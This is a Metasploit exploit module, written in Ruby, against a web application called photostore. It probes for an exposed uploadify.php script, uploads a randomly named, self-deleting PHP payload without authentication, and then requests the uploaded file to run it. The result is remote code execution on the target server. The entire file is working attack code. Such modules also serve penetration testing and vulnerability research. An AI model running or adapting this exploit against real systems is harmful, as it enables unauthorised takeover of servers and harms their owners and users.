##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'photostore',
      'Description'    => %q{
          This module exploits a vulnerability found in photostore. By abusing the uploadify.php file, a malicious user can upload a file to a
        temp directory without authentication, which results in arbitrary code execution.
      },
      'Author'         =>
        [
          'Gabby' # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://metasploit.com' ]
        ],
      'Payload'       =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'php',
      'Arch'         => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],
          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'dec 2013'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The full URI path to photostore', '/photostore'])
      ], self.class)
  end

  def check
    uri =  target_uri.path
    uri << '/' if uri[-1,1] != '/'

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "#{uri}assets/uploadify/uploadify.php"
    })

    if not res or res.code != 200
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    uri =  target_uri.path
    uri << '/' if uri[-1,1] != '/'

    peer = "#{rhost}:#{rport}"

    @payload_name = "#{rand_text_alpha(5)}.php"
    php_payload = get_write_exec_payload(:unlink_self=>true)

    data = Rex::MIME::Message.new
    data.add_part(php_payload, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{@payload_name}\"")
    data.add_part("#{uri}assets/uploadify/", nil, nil, "form-data; name=\"folder\"")
    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    print_status("#{peer} - Uploading payload #{@payload_name}")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => "#{uri}assets/uploadify/uploadify.php",
      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
      'data'   => post_data
    })

    if not res or res.code != 200 or res.body !~ /#{@payload_name}/
      fail_with(Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    upload_uri = res.body

    print_status("#{peer} - Executing payload #{@payload_name}")
    res = send_request_raw({
      'uri'    => upload_uri,
      'method' => 'GET'
    })
  end
end
